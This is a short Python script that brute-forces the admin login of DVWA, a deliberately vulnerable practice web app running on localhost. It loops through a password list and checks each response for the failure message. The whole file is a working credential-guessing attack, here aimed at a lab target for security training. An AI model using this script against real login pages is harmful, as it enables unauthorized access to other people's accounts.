from utils import *

proxy = {
    "http": "127.0.0.1:8080"
}

def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)

    return q

def send_credentials(session, url, data):

    target_url = url
    for k, v in data.items():
        target_url+=f"{k}={v}&"
    target_url = target_url[:-1]+"#"
    response = session.get(target_url)   
    return response

if __name__=="__main__":
    BASE_URL = "http://localhost:4280"
    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
    filename = "pass.txt"
    username = "admin"

    
    q = get_passwords(filename)   

    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.LOW
        for password in q:
                      
            data = {
            "username": username,
            "password": password,
            "Login": "Login"
            }
            response = send_credentials(s, bruteforce_url, data)
            
            print(response.text)
            
            print(" "*40, end="\r")
            print(f"[!] Testing: {password}", end="\r")
            if "password incorrect." not in response.text:
                print("")
                print(f"[+] Found: {password}")
                break